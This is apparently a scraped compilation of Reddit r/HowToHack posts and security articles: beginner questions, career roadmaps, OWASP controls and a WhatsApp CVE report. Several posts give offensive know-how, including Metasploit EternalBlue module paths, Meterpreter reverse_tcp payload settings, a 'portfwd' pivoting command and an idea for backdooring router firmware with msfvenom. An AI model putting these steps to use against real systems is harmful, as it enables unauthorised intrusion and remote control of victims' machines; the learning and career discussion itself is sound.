Using this meterpreter session (session 1) i know that another server, 10.3 (only accessible from 192.2) is vulnerable to eternal blue. I want to send the exploit hoping to get a meterpreter shell back, but I'm not able to get one. I've set up a route to use my meterpreter session 1 when accessing this 10.x network as 10.2, which allowed me to port scan 10.3 as well as test the eternal blue exploit vulnerability. I think I need to set up a portfwd through meterpreter as well as set the lhost and lport for my meterpreter/revese\_tcp exploit, but I can't seem to get the configuration right. I set the payload as meterpreter/reverse\_tcp I was thinking to set up the lhost and lport to 10.2:443, with a ""portfwd add -l 4444 -p 443 -r 10.2"" then set rhost to 10.3 and fire the exploit. But I get a response that the ""Exploit completed, but no session was created."" I try to use another msfconsole session with the multi/handler exploit to catch the response, but the portfwd reserves my local port and I'm not able to use it. I think it's because I don't understand the portfwd'ing or the way in which lport/lhost works for throwing this exploit. &amp;#x200B; Any tips on how to catch this response?"

WhatsApp has been discovered to have a critical vulnerability that could have allowed attackers to remotely access files from a Windows or Mac computer. The vulnerability, which has been fixed by Facebook, could be exploited using the WhatsApp desktop application. It was a mix of multiple high-severity flaws that existed within the WhatsApp desktop application. Some of those flaws were also a part of the WhatsApp Web client that works on Web browsers. The vulnerability essentially allowed for [cross-site scripting (XSS)](URL that could be used by remote attackers. PerimeterX researcher Gal Weizman discovered the WhatsApp vulnerability that has been tracked as CVE-2019-18426. The researcher stated that the security loophole existed within the Content Security Policy (CSP) of WhatsApp that allowed for XSS attacks on the desktop app. The flaw in the CSP also impacted the WhatsApp Web client to some extent as it provided space to alter rich preview banners with malicious content. The researcher in a blog post mentioned that the Web client was vulnerable to an open redirect flaw that could have led to persistent cross-site scripting attacks triggered by sending specially crafted messages to WhatsApp users. However, the scope of the loophole is found to be quite wider on the WhatsApp desktop application over what was discovered on its Web client. The researcher found that he was able to read the file system and identify the remote code execution (RCE) potential on the desktop application. The only thing that the affected WhatsApp users had to do was to click on the specially crafted message to provide backdoor access to attackers. read more [WhatsApp Bug](URL"

Define Security Requirements Security requirements provide needed functionality that software needs to be satisfied. It is derived from industry standards, applicable laws, and a history of past vulnerabilities.Instead of having a customized approach for every application, standard security requirements may allow developers to reuse the same for other applications. ## 2. Leverage Security Frameworks and Libraries Third-party libraries or frameworks into your software from the trusted sources, that should be actively maintained and used by many applications. Leveraging security frameworks helps developers to accomplish security goals more efficiently and accurately. ## 3. Secure Database Access This section summarizes the key areas to consider secure access to all data stores. 1. Secure queries 2. Secure configuration 3. Secure authentication 4. Secure communication ## 4. Encode and Escape Data Encoding and escaping plays a vital role in defensive techniques against [injection attacks](URL The type of encoding depends upon the location where the data is displayed or stored.The different types of encoding include HTML Entity Encoding, HTML Attribute Encoding, JavaScript Encoding, and URL Encoding. ## 5. Validate All Inputs Only the properly formatted data should be allowed entering into the software system. The application should check that data is both syntactically and semantically. ## 6. Implement Digital Identity Digital Identity is the way to represent the online transaction, below are the OWASP recommendations for secure implementation. * Authentication Levels * Session Management * Tokens ### 7. Enforce Access Controls Access Control involves the process of granting or denying access request to the application, a user, program, or process. Below are the OWASP Guidelines. * Design Access Control Thoroughly Up Front * Force All Requests to Go Through Access Control Checks * Deny by Default * Principle of Least Privilege * Dont Hardcode Roles * Log All Access Control Events read more [Owasp released top 10 proactive controls](URL"

Pretty much no restrictions, except that it has to be something more than a very basic thing. I was thinking about getting my hands on a Virgin Media router (I'm in UK) and trying to find some vulnerability that I can exploit into a backdoor in its firmware, and maybe somehow automate that process after. I researched a bit and I figured that msfvenom can basically do it for me after I find the filesystem used by the firmware. Another idea I thought of is doing a nmap tutorial, something like vimtutor, but obviously for nmap. I also have a BeagleBone Black I could host some vulnerable services on (or use it for other ideas). So, I wanted to ask you for some help. Do you think that the automation of finding backdoors in router firmware is doable by a newbie? Or should I maybe stick to the nmaptutorial / another idea? Any suggestions are welcome."
36,vulnerability,HowToHack,Confusion on selection of exploits and payloads in Metasploit using openVAS.,1,fakty7,https://www.reddit.com/r/HowToHack/comments/fakty7/confusion_on_selection_of_exploits_and_payloads/,2020-02-28 10:09:32,"Hey everyone. Just want to make sure I have all of this right as far as the process. This is assuming I am already connected to my target network and I have identified a target PC with a vulnerability. So I use openvas to scan, and find a windows machine with SMBv1 enabled, a 10 severity exploit. I look it up on google and see that its eternalblue and I can use this with metasploit, so I go and search for ""eternalblue"" modules in metasploit, and I have like 5 different ones: auxiliary/admin/smb/ms17_010_command auxilary/scanner/smb_ms17_010 exploit/windows/smb/ms17_010_eternalblue exploit/windows/smb/ms17_010_eternalblue_win8 exploit/windows/smb/ms17_010_psexec How do I pick which one to use? I assume ""exploit/windows/smb/ms17_010_eternalblue"" because it seems like the ""default""? From there, I would choose the payload, I've been told that reverse_tcp might be the best to try, so I pick ""windows/x64/meterpreter/reverese_tcp"" as my payload and all of that fun stuff. I'm almost positive I have the rest of the steps to execute it, setting hosts and all. From my understanding, what happens now, is my eternalblue executes and the payload is deployed, and I get a connection to the PCs terminal so I can have all of my fun. Am I ballpark here? Also, if anyone has any tips on deciding which payload to use instead of me just saying ""This is what I was told to use"" I'd appreciate it. Thanks all."

38,vulnerability,HowToHack,What You Need to know to become a Hacker,1,fc2w2e,https://www.reddit.com/r/HowToHack/comments/fc2w2e/what_you_need_to_know_to_become_a_hacker/,2020-03-02 10:40:04,"So this question is asked quite frequently, and I thought it would make the most sense to explain what you'll need to know to become a hacker in this post. Now, before we get into the technical details, first some background about me. I have a Master of Science in Computer Science with a concentration in Telecommunications and Network Security. I have a Bachelor of Science in Information Technology with a concentration in Computer Forensics and a double minor in Computer Science &amp; Cybersecurity. And I have been a member of a Red Team for the past couple of years. So what are you going to need to know to be a Hacker? Here are the key concepts from the Study Guide that I used to prepare for an exam to get my Red Team Job Here's the list: - Programming/Scripting. You'll need to know basic programming concepts, and how to read and interpret scripts/code. You will need to be familiar with Shell scripting (e.g., cmd, wmic, bash), Interpreted languages (e.g. Python) and how to Interpret source code and scripts (e.g., Flow, variables, loops). You should be pretty familiar with a Scripting and/or programming language. You'll be able to find tons of information online regarding learning how to code. - Computer Architecture &amp; Networking. You'll need to understand the fundamentals and theory behind computer design, computer networking, and basic computing concepts. Some things you should be aware of is, Computer Math numbering systems and conversions, Computer concepts (e.g., CPU architectures, virtualization), Memory organization and layout, Storage concepts (e.g., hard disk drives, solid state drives) and the difference between kernel and user space. A good resource for learning this is [Computer Organization and Design ARM Edition:The Hardware Software Interface](URL - Operating Systems (Windows and Linux/UNIX). You'll need to learn of computer systems administration, software interactions and I/O interactions in either Windows or Unix implementations. Some things you'll need to know are Standard administrative commands, Local system configurations, Data security and integrity protection, Antivirus concepts and file systems. A Great resource for learning Operating System is the book [Operating System Concepts Tenth Edition](URL That website contains tons of useful information for that book including slides and study guides. But as a prerequisite for learning Operating Systems you should already be familiar with basic data structures, computer organization, and a high-level language, such as C or Java. - Network Design. You'll need to be aware of the operations, management, and maintenance of computer networks, protocols and standards and how they integrate with one another. Some things you should be familiar with are IP / subnetting, Ethernet, Routing, Network layout and design (i.e., network typology) and Networking device concepts (e.g., routers, firewalls, intrusion detection systems). There is a great CCNA prep course available [here](URL that you can learn this from. A good book to learn about Networking is [Computer Networking: A Top-Down Approach, By James F. Kurose](URL [This](URL is also a good resource for learning about networks from a security point of view - Networking Applications and Services. You'll need to know Protocols, and ports for standard network services, Network services and ports on standard Windows/Unix installs, Network-related commands and Network service administration and configuration. For this you can use the resources from above. So those are the Fundamentals that you need to know to become a Hacker. Once you have those down, you can move onto learning some more advanced concepts. Some of those concepts would be: - Information security tools and techniques: Network monitoring, Network mapping, Vulnerability scanning, Penetration testing - Offensive information security - Digital forensics and data recovery - Voice/data communications (satellite, RF, wireless, and telecommunications networks) - Public key infrastructure and encryption systems - Command line tools - Network traffic analysis - Computer and network forensics - Vulnerability and malware analysis - Low level protocol and packet analysis So I am aware that many people want to become a Hacker or Penetration Tester professionally so I will briefly be discussing how one can best do that. **Education**: For a Degree, i'd recommend a degree in Computer Science, Computer Engineering, Computer Security, Cybersecurity (Technical Track), Cyber Operations or Information Technology. I'd recommend attending a school that is either an NSA Accredited [CAE-CD](URL or [CAE in Cyber Operations](URL **Experience**: You're going to need some experience if you're going to become a Pen Tester or Red Team Member. Some good experience to gain would be UNIX/Linux system administration, Windows system administration, Network Security, Network Administration - security and engineering, networking equipment (routers/firewalls/switches) and VPN administration **Certifications**: Some good entry level Penetration Testing Certifications would be the OSCP, very practical and well respected. And the Security + is generally a baseline for Security Jobs. And i'd advise against the CEH, its not practical at all and you can just memorize the answers and pass without actually knowing how to hack anything **Good ways to practice**: Theoretical knowledge is nothing if you cant practice it. There are a number of different ways you can get experience in Offensive Security (Legally of course). Capture the Flag Events such as the National Cyber League are great ways to apply your knowledge. And HacktheBox (while a bit more advanced) is probably the closest you can get to a real world Network Penetration Testing environment. **Conclusion**: I couldn't cover everything here, but I hope I was able to give you guys some solid knowledge that you can build on. Feel free to ask me any questions or send me a message if you have any questions. Thanks!"

47,vulnerability,HowToHack,SnowHat | Game Hacking | Bug Bounty Platform,1,ece5cr,https://www.reddit.com/r/HowToHack/comments/ece5cr/snowhat_game_hacking_bug_bounty_platform/,2019-12-19 02:35:34,"Dear fellow hackers, As a startup company (Cyrex Ltd) that is specialised in application security, we are developing a bug bounty platform (codename: SnowHat) that is entirely focused on hacking gaming applications. We strongly believe that gaming applications are different to classic industry applications. Consider the used programming language, frameworks, architecture used and more importantly the way data is being transmitted (transport protocol). Therefore, it's a natural direction for us to create a bug bounty platform that is fully focused around the security of gaming applications. The objective of this thread is to validate the concept of our product/service. Therefore, **your** **feedback** is extremely valuable to us, especially in this phase of development where the platform is subject to constant change. **Mindset** Game hacking is very different in comparison to classic penetration testing, it requires two mindsets: one of a cheater and one of a hacker. Two very similar mindsets yet there are distinct differences between them. Cheating is all about finding an advantage that a regular player would not be able to have, this requires gaming knowledge, strategic insights and most importantly quickly understanding in game mechanics. While hacking is all about exploiting technical vulnerabilities, understanding what is going on under the hood of the application. **Assets** The platform currently covers the following categories: 1. Games (browser, mobile, client and console) 2. Game relatable applications (forums, launchers, management tools, ...) 3. Anti-cheat solutions/wrappers (EAC, BattlEye, ...) **Gamification** Through gamification (challenges, achievements, ...), we want to create a bug bounty platform that encourages hackers to start their journey as a white hat security expert and more importantly reward them for their findings. We have implemented clan mechanics, just like in any other MMO, this in order to build a community and add in that competitive element, which really takes this platform to a next level. Ranks are implemented accompanied by leaderboards and ranks are based on the prestige of the player. Prestige points are unlocked for each legit disclosed report. **Communities** For SnowHat, it made full sense to cooperate with hacking communities as these communities are often where all things start. They act as a gold mine of educational resources that will help any hackers in developing their hacking skill set. Therefore, we want to give back to those communities by partnering up. For each member originating from these communities that finds a vulnerability, a percentage of the bounty is paid back to the community by SnowHat. Two large partnerships were established so far, attracting over 500K members to the platform. **Gaming companies** Next to generating a user base of ethical hackers, we started establishing partnerships with gaming companies, an obvious yet fundamental element that will define the success of SnowHat. The platform targets mid-to-large size companies that either develop or publish gaming applications with online multiplayer features (as there's no such thing as security in offline games). **Communication and QA** The SnowHat team acts as an intermediate communication layer between the ethical hacker and the gaming company. The ethical hacker will never be in direct contact with the gaming company, the ethical hacker will be collaborating with SnowHat staff, vice versa for gaming companies. In this way we can maintain and enforce quality assurance on many different levels (communication, quality of report, triage, ...). **Release** Best-case, we are planning to release into beta mid Q2 2020. At first, the beta will only be accessible to the members of the communities we've partnered with. After continuous validation of at least 1 month, the platform will be publicly available to anyone. To give you an idea of what the platform will look like, we included the following images (screenshots). Take into account that all of this is subject to change, thus not a final version. By using dummy data some of the screenshots might be confusing. &amp;#x200B; *Processing img qocr68x5ue541...* &amp;#x200B; *Processing img akucrc07ue541...* &amp;#x200B; [Frontstore - Companies](URL &amp;#x200B; [Hacker dashboard - Hacktivity \/ Pwnage](URL &amp;#x200B; [Hacker dashboard - Hackables](URL &amp;#x200B; *Processing img i8gnc5fcue541...* &amp;#x200B; [Hacker dashboard - Leaderboard](URL &amp;#x200B; *Processing img vum7svtgue541...* &amp;#x200B; *Processing img j8ocjm8iue541...* We want to thank the Reddit users in advance for reading this post and more importantly for giving their feedback.

So many tools, ways to hack, steps, like the possibilities are endless, but now, it seems like there is only a straight forward way to do things. For example, this is the basic HTB hack for me, do an nmap scan, explore the website, brute-force using dirbuster, find a vulnerability in one of the open ports from the nmap scan, look up the vulnerability, and exploit it using some exploitation software like metasploit. That has always been the way to do it. Ive never gotten into realistic boxes just because of the lack of experience, but thats why Im asking today. I want to get into the more realistic boxes, but I dont know how. The only method I know is the one in the paragraph above. I dont get the idea of hacking when its not done like that. Ive looked everywhere for different methods, Ive tried a lot, but failed. Im pretty decent with python and Im interested in creating exploits with it, but I cant find any vulnerabilities in any software to exploit. If I had VIP on HTB, that would probably end most of the problems Im currently having, but I dont, and I never will. Paying for anything at all is off the table, Im doing this without buying books or paying for services online. What do I do? Im fairly young, 14 to be exact, and Im lost. Ive been in the programming scene since I was 12 and dont plane on leaving. Ive been strictly python, and since last year, Ive gotten into hacking, ethically, of course. I wish to combine my two favorite hobbies (hacking and coding) and maybe create exploits, but to do that, I first need to find the vulnerability/vulnerabilities, know how to exploit the vulnerabilities with a pre-made exploit, then create my own (that was my thought process anyway). In the end, the problem is, I have no clue how to hack. I have trouble with some of the simplest boxes, (Ive tried Networked, I failed miserably) I got into OTW Bandit, and had to look up a lot of the answers. I need help. Ive been doing this shit for the past year and still have no clue how to do it, but its a passion, I want to pursue this career, but I cant do it without help. And for the few people that read this far, thank you. So what am I asking? All I want is a source, book, YouTuber, blog, website, or even just somebody to help me better understand the tools I have at hand. I have a computer, I have Kali installed on a VM, along with Linux Mint for coding my python projects, Metasploitable 2 and windows for trying to use exploits that always fail in the end. If somebody could point me in the right direction, that would be amazing. I want to learn how to hack outside of the realm of using nmap to scan for open ports with vulnerabilities that can be exploited with a google search. I want something more realistic, but I dont have the money to pay for anything like VIP Access to HTB. Is that even possible? Ive hit the plateau that everyone hits, and Im ready to get going again. Any and all help is welcome, and thanks to everyone in advance. TL;DR: I want to learn to hack outside of the realm of doing an nmap scan on an unrealistic target and using exploits from google searches. FOR FREE"

Questions: 1. What are steps for web/db enumeration? Can i assume it goes like this? Step one: you have a host. First is to bruteforce/identity all the sub-domains Step two: look for ip, host, services, versions for the sub-domains Step three: look for version vulnerabilities, scan for vulnerabilities. Is this correct? Always start with sub-domain enumeration? Or what the correct steps? Anything else to add on? 2. There are so many tools out there, i know nmap, dnslookup, dig, whois for host info gathering, starting to learn about tools for subdomain enumeration, crimefare, cloudfail, hatcloud for cf, nikto and owasp zap for vulnerability scanning. What are the usual tools that you use for each phase? Appreciate if you could offer some tips. Cheers"

If you have clear vision or cause for which you are working then lets start. Basic tips before starting the journey:- 1.Sleep less ,read more.Learn and think and try and fail and never give up.Remember imagination will take you everywhere. -{Gokmen Guresci} 2.Hacking is an art,and a hacker is an artist. -{Ali} 3.Master a concept then move on to another. 4. Do not rely on tricks for hacking as they will keep you a script kiddie,get deep understanding about stuffs.Also do not rush from one topic to another. -{Bluff Master} 5.A support will always lift you up.Join groups,forums.Keep yourself updated with latest hacking news. -{Sahil Sehgal} 6 Do not compete anyone, never think you are the best,just competethe you in the past.There will always be a vulnerability waiting. 7.[Think Creatively] -Hackers are like artists,philosphers,engineers all rolled up into one.. 8.Learn to love solving problems. 9.Walk the path no one travels. 10.Experiment a lot. 11.Stay paranoid and trust noone.(hmmmm) 11.Study cyberlaws and big hacking events that has happened in the past. CHAPTER-1(Voyage begins) 1.Learn fundamentals of computer{work on command prompt in Windows} 2.Understand the basic concepts of operating systems. 3.Study the fundamentals of networking and security. 4.{Know the jargon}-The computer industry has thousands of acronyms and terms,get familiar with them. 5.Virtualization:- Learn to setup and use Virtual Machine or VMware. Most people start with the Kali Linux.Here is youtube link to learn complete Kali Linux and its commands:- 2. Kali Linux - Complete Training Program from Scratch - YouTube ____PROGRAMMING LANGUAGES____ This topic confuses a lot of people.People are not sure about whether they should learn a language or not. Yes,you will have to learn some languages but these arent necessary initially.If you are new to hacking then play around for sometime,learn about hacking.With time spent you will have learnt a lot about hacking and things you need to learn.Now slowly start focusing on a language.I would recommend Python cause it is easy and best for scripting and automation tasks.Work on it but do not stop your course of hacking.Master python, by the time you will master it,you will have acquired tremendous skills in hacking.Now move to a new programming language like java,ruby,c/c++.Master 3 or 4 languages but get to know as many as you can because later when you will be dealing with real life hacking scenarios you may encounter codes of any language. Learn HTML. Chapter-2 (From where to learn) 1.Some free courses for you:- a.How to become hacker | Complete Ethical Hacking Course Beginner to Advanced #Hacking (16 hour long complete basic to advanced course.) b. The Complete Linux Course: Beginner to Power User! (7hour complete linux course) 2.If you can pay,there are many amazing courses available like Certified ethical hacker by EC Council(they provide a certificate too),a number of courses are available on udemy,udacity etc. 3.Google- everything is available you just need to search for it.Go on google,do a deep search,you will find treasure(of knowledge) there.(telling this by experience) 4.Treasure- Join telegram!Yep,just join it and join some hacking channels on it and you will have treasure in your hand(thats all i can say about it.) BOOKS Some of the best:- 1.The art of invisibility by Kevin D Mitnick 2.Hacking the hacker 3.Hacking the art of exploitation by Jon Erickson 4.Grey Hat Hacking- The ethical hackerss handbook i urge you to read this book: a.The Ghost in Wires This book is written by Kevin Mitnick. This book covers his life story.He is one of the most famous hackers in the world. CHAPTER-3(SHERLOCK) Social engineering is one of the most interesting and useful part of hacking. It basically means to hack people.If you are good at it then you have a dangerous weapon in your arsenal. If you learn to hack people,you will understand to hack systems. Learn social engineering.Observe people around you.Decode their behaviour .Learn to find the flaws of human behaviour . Read pyschology books(a lot).Like - What Every Body is Saying by Joe Navarro There are a lot of things in social engineering,watch about it on youtube and read about it on google. Chapter-4(Final tips and destroying some myths) 1.Practice your skills.There are many websites available on google where you can practice. 2. Be persistent,cause it is the key to success. 3.Meditate,do some physical exercises,do not risk your health at any cost. 4.WORK-WORK-WORK-PRACTICE-PRACTICE-PRACTICE. 5.There will be times when you will feel demotivated but only key is to keep working. 6.There is no age limit to learn it- NEVER BE TENSED IF YOU HEAR ABOUT SOME 16YEAR OLD PRODIGY CODING OR CREATING SOMETHING AMAZING IN YOUR FIELD. JUST KEEP WORKING.COMPETE WITH YOUR OWN PAST. 7.You can earn a lot if you have the skills,so first build skills then start earning. 8. It will take time,there is no shortcut in here. ALWAYS BE PARANOID AND CAUTIOUS WHILE WORKING ON HACKING.ALWAYS FOCUS ON BEING ANONYMOUS .DO NOT TAKE RISKS WHEN YOU ARE BEGINNING.USE YOUR SKILLS FOR GOOD AND A CAUSE. Start small and eventually go up.Slow and steady wins the race. SWEAT MORE IN PRACTICE SO YOU WILL BLEED LESS IN WAR. This structure has been devised by me,it may have some errors or it may not be perfect.I have constructed it by experience.I have tried to keep it as simple as possible. Share it so everybody can learn.Show some love. SAVVY:)"

There is supposed to be a fixed maximum supply of 21 million Bitcoin, but the hacker, in a single transaction, created 8,784 times more Bitcoins than ever should exist.'' What does it mean ''did not work if outputs were so large'' ? The output of what? ***so large that they overflowed when summed ...*** what does this mean? can you make an example to let me understand? The sum of what + what? And why does this sum caused a bufferoverflow? A buffer overflow isn't it when for example there is an array and then there is no definied lenght for the array and you put in more than the array may own? In this case from what is the buffer overflow caused by? Also interstead in what does this string mean: vMerkleTree: 012cd8 1d5e51 618eba what does this mean?"

We will have Nessus, Acunetix and Kali Linux on it. &amp;#x200B; My question is 2 part: 1. What specs should I have on this Mac mini? I'm thinking i7, 16GB, 1TB. 2. What tools would you guys put on here? We will do network pentesting and vulnerability assessments in the health care sector with doing very little web app testing. We have Nessus for network and Acunetix for web app. So, I'm thinking a VM for each and a VM for Kali Linux, then use some of the tools in Kali Linux. Thank!"

Get paid six figures to break into computers,networks,web applications, and be completely legal? Do you want get paid to take security courses, attend conferences, expand your knowledge and work with some of the best minds in Information Security? Then becoming a penetration tester is what you want. This article will cover the knowledge and experience needed to become a penetration tester. &amp;#x200B; A bit about me, without doxing myself. I have a Master's degree in Information Systems and Security. I have multiple security related certs including OSCP, PPTP, CEH, and CHFI. I am a professional penetration tester, I work for a company that provides everything from basic vulnerability assessments and compliance review, to Red Team engagements. My day to day includes going from basic network access to full Domain Admin. We test web applications, internal and external network testing, APIs, wireless technology, and physical break in methods. While I am certainly not an expert on all those fields I do have at least above average knowledge on each of them. &amp;#x200B; I will attempt to provide the knowledge you will need to attain at least an entry level position as a penetration tester. The information I will provide below will not teach you how to be a super hacker, black hat malware writer, or how to run a RAT. Instead I will provide a road-map of goals that should assist you in becoming a professional penetration tester. Being a professional is not for everyone, do you have what it takes? &amp;#x200B; &amp;#x200B; First Steps Down a Lengthy Road &amp;#x200B; &amp;#x200B; A pentester must know a lot about a lot, while specializing will be a goal after you are hired, you must be a general expert in many fields of study. It can be very daunting for a budding infosec student or hobbyist to look at everything a pentester should know. A lot I.T people will fantasize about being a pentester, but most of them won't even start the process because it seems very difficult and time consuming. And they are correct. If you don't absolutely love security testing, talking about security subjects, learning new techniques, and having to spend hours (if not days) to figure out a problem, then this is not for you. &amp;#x200B; Still here? Alright lets dig into what subjects make up the core knowledge an entry level pentester should be very well versed in. &amp;#x200B; 1. Networking &amp;#x200B; One of the most essential skills for a penetration tester to learn is how computers talk to each other. Learn the ins and outs of TCP/IP, 3-way handshakes, protocols and packet inspection. Get to the point where you can go to a white board and map out a network communication using the OSI module and write in depth how it all works. Don't just know each level of the OSI module, fully understand each level, know every protocol associated with each level. This is crucial because analyzing traffic through packet dumps you will need to analyze every wrapper, every address, etc. An expert will be able to read and manipulate network traffic on the packet level, once you have that sort of understanding you are solid. &amp;#x200B; How to prepare: &amp;#x200B; \* Study Network+, CCNA Security, read TCP/IP Illustrated Part 1. \* Practice with Wireshark, inspect traffic, understand how packets are created and transmitted. \* Study HTTP, know it inside and out. ""HTTP The Definitive Guide"" is a great resource. \* Use Burpsuite (more on this later) to proxy and inspect web traffic. &amp;#x200B; &amp;#x200B; 2. Understanding the Internet &amp;#x200B; In the networking section I mentioned HTTP and Burpsuite, so lets discuss that next. Most people think they understand the internet, they are wrong. Can you write out a full HTTP request and response? Do you know every HTTP verb? Do you know the difference between HTTP 1.0 and HTTP 1.1 and HTTP 2.0 or HTTP 0.9 without having to research it? Do you know most of the HTTP response codes, not just general information but specific codes. Do you know how a CDE works? Ok lets assume the answer to most of that is no because most people don't actually study how the internet works. When you are performing web application testing, code review, and API review, you will need to know how it all works. &amp;#x200B; How to prepare: &amp;#x200B; \* Read ""HTTP The Definitive Guide"" \* Read ""The Tangled Web"" \* Be familiar with RFC 2616 and other related RFCs. \* Practice inspecting web-traffic with both Wireshark and Burpsuite. &amp;#x200B; &amp;#x200B; 3. Operating Systems &amp;#x200B; As a pentester you will have to test all operating systems. You don't get to choose only Windows environments running only Windows 7 and below. You will run into many different types of environments, running Linux and Macs as well and Windows. You should be comfortable with all types of operating systems and how to enumerate information, use of command line (CMD, Powershell, Bash), and how to download/install and execute programs. Looks simple but that is a lot of knowledge. If you got access to Windows Server 2012, could you change roles, add a new admin, push updates etc? If you got on a Ubuntu Box as a webuser, can you enumerate to find insecure files or permissions? Of course you don't need to memorize everything, Google is your friend, but you should have a general knowledge of how to do everything and use Google as a backup for the fine details. &amp;#x200B; How to prepare: &amp;#x200B; \* Create a VM of at least one Linux distro and one Windows Server. A Mac VM would be handy, but it is similar enough to Unix that knowing Linux commands will at least help. With those VM's or using them as hosts, attain admin level knowledge of their functionality. There are many web courses, books, and websites that will provide you with great knowledge. &amp;#x200B; &amp;#x200B; I Have the Core Knowledge, Now What? &amp;#x200B; &amp;#x200B; Congratulations, if you attained all the core knowledge listed above, you are no longer a noob. That is a lot of knowledge to have about technology and with it you can probably get a decent entry level tech job. Now it is time, if you haven't already, to get a job. Most pentesters come from varying backgrounds such as Network Admin, I.T Helpdesk, Security Analyst, Web Development, Programmers, and more. The point is, get a job in technology, doesn't need to be security related immediately though that is a bonus. At this point you should also look at getting a few certs, Network+ and CCNA would be great for getting into a networking job. MCSA is good for geting into a System Admin role. If you mastered the core knowledge then you should have no issues getting a few of the entry level certs. &amp;#x200B; You may be asking, why wasn't programming listed as core knowledge. There is a good argument that it should be but I think programming should be part of the next step. Mastering everything in the first section will take at least a year or two depending on how fast you can learn, your current background in technology, etc. Adding programming on top of that immediately will take up even more time, and if you don't have a reason to learn coding yet then you are likely to forget a lot. &amp;#x200B; Ok so now you have a job in I.T, it pays shit but it looks good on the resume. Every job you have from now on will be a stepping stone. Don't expect to remain at any one job for more then two years because the way to the top is a ladder and getting complacent will get you stuck on a lower rung. Of course if you do find that you really enjoy being a Network Admin, System Admin, Security Analyst and don't feel like pursuing Penetration Testing, that is perfectly fine. Those jobs are great and will provide you with a good future. &amp;#x200B; Now though, for those who want to keep climbing the ladder, we start to dig deep into security. How to Become a Hacker? &amp;#x200B; &amp;#x200B; &amp;#x200B; 1. Learn Defensive Security &amp;#x200B; Probably one of the most asked questions on HF is how to become a hacker. Well to start off if you mastered those core topics you are well on your way. Now we can apply security to each of those core topics. I find it best to learn Blue Team (Defensive Security) before jumping into Red Team (Offensive Security). Because while studying defensive security first you will also learn about offensive security. And any pentester should know what kind of defenses may be in place to prevent a reverse shell, code execution, logging, standard AV behavior and more. Also going down this route can lead to a security analyst position which is a great lead into penetration testing. Of course you can skip this step if you want, learn the advance subjects listed later, and you probably can still get into penetration testing. This is only my recommendation. &amp;#x200B; How to Prepare: &amp;#x200B; \* Study: Security+ and CISSP (don't have to get cert but at least study). \* Understand common defense techniques such as how Anti-Virus works, how Web Application Firewalls work, how Firewalls/IDS/IPS work and where they are installed in networks. \* Create your own lab setup, play with setting up Splunk and other free security tools. \* Study compliance such as HIPPA, PCI DSS, and FedRAMP. Study standards such as ISO 9000 and NIST. &amp;#x200B; At this point you should be able to design, at least on paper, a fully secured network and understand each type of security device you put in place for the layered security. You also should be able to write a Security Policy and understand different security controls based on the compliance or security standard any company may want to utilize. &amp;#x200B; If you are not a Security Analyst or on an I.T Security team at this point, start applying. You now have the knowledge to get at least a level 1 security position. &amp;#x200B; 2. Can I Start Coding Yet? &amp;#x200B; Yes, now it is time to learn how to write programs. One thing to keep in mind is that you don't need to be a programmer to be a penetration tester. In fact, unless you already are a programmer, studying to become one would be a waist of time. What you should know though is the basics of computer science and how to write at least basic scripts/programs for security testing. We want to know how to test applications, find insecure code and exploit it, but we don't need to be dev ops to do that. Of course the more you know about programming the better you will be at testing it, but that is only one of many areas a pentester needs to know. If programming is your thing then you should start that much earlier in the training, add it to your core knowledge set, go to school for it, and make that your job. You can later move to penetration testing if you want but there are better jobs in my opinion, such as Malware Analyst (reverse engineer) or Security Researcher (finding and creating zero days exploits). Both of which rely heavily on being an expert at programming and are also awesome jobs. &amp;#x200B; For penetration testers though we want to keep it simple. Python is a great language to learn and master. You can learn about computer science with Python, write custom security tools etc. Python runs natively on Linux and Mac and soon Microsoft will be adding it natively on Windows. I recommend learning Python 2.x first but also know how to write in Python 3.x. There are a ton a great free resources for learning Python but the one I found most useful for starting out is ""Learning Python the Hard Way"". After that you can move to books like ""Black Hat Python"" and ""Violent Python"". &amp;#x200B; While I recommend sticking with one language until you truly mastered it, there are other languages that will be valuable to learn, at least to the point where you can read source code and understand it. &amp;#x200B; \* C and ASM for exploit development. \* PHP for server side. \* HTML for web development. \* JavaScript for client Side. &amp;#x200B; By no means is this a complete list of languages to be familiar with but it is a great start. Once you understand programming basics it really comes down to learning different syntaxes. Of course there are many differences between Python and C (not to mention ASM) but you should be able to jump into C and be able to apply some previous knowledge to it. Once you know the basics, one of the best ways to learn coding is to review source code found on github and other places. &amp;#x200B; 3. Learn Offensive Security &amp;#x200B; At this point you should be level 2 or 3 in whatever security job you chose. You know all the security lingo, you can program, you can develop security policies and perform risk analysts etc. You are comfortable and an above average user on any operating system. You should also have at least two to four certifications. So lets get into the nitty gritty of popping shells. Once you start really digging into security testing you will understand why you had to learn so much other information first. Imagine attempting a reverse shell from a friends computer to your local host, and nothing happens. You don't understand, the software worked in your personal lab so whats wrong? Well that is where networking knowledge comes in. Maybe the program does not have the correct permissions, maybe an AV is blocking it, there are many possibilities and if you lacked the above knowledge you would be stuck, probably writing a post on HF asking for help. But because you followed this tutorial and you studied hard for the last few years, you can easily troubleshoot the problem. Now it is time to learn about the art of hacking. &amp;#x200B; How to Prepare (in no particular order): &amp;#x200B; \*\* Highly recommend reading ""Web Application Hackers Handbook"". Know it inside and out. \* Pick up a book on the basics of hacking. The material will be very out dated but it will provide you solid knoweldge. \* Use YouTube and other sources to learn about: getting shells such as php shells, reverse shells, bind shells, etc. \* Learn about enumerating a host, port scanning, manual and automated methods of searching for security vulnerabilities. \* Learn how to exploit well known vulnerabilities, such as MS08-067 and MS17-010. \* Learn basics of privilege escalation methods, both manual and automated. \* Learn how to enumerate hosts in a network, capturing packets in wireshark, doing broadcast scans with nmap, using netbios and smb to enumerate hosts etc. \* Learn how to research for vulnerabilities. \* Be able to modify scripts to fit your needs. And be able to troubleshoot older exploits to work with more modern libraries. &amp;#x200B; Truly there is a lot that I didn't cover. This section is more about organic learning then a strict regiment. You will bounce from topic to topic. As you learn more about one subject you will find something you don't understand and you will study that as well. For a more controlled learning environment I would suggest some online courses. They are expensive but they will provide a more comprehensive and structured form of learning. The PWK is good for those who are already advanced with the core hacking subjects. While elearnsecurity is very good for those who need a bit more hand holding to learn the same (and more) skills that the PWK teaches. Your goal now is to get the OSCP but you can get something like PPTP first to help prepare you for PWK. &amp;#x200B; 4. Practice Practice Practice. &amp;#x200B; Now its time to put all that information to practicle application. Time to practice your skill set. There are a couple of methods to practice legally. &amp;#x200B; 1. Build your own lab. 2. Use an online lab. &amp;#x200B; In this day and age there is no reason not to use online labs except if you want to be familiar with how to set up a virtual lab. There are many free labs online including ""[hackthebox.eu](URL and ""[hackthissite.com](URL as well as others. Then there are paid for labs which are very beneficial such as 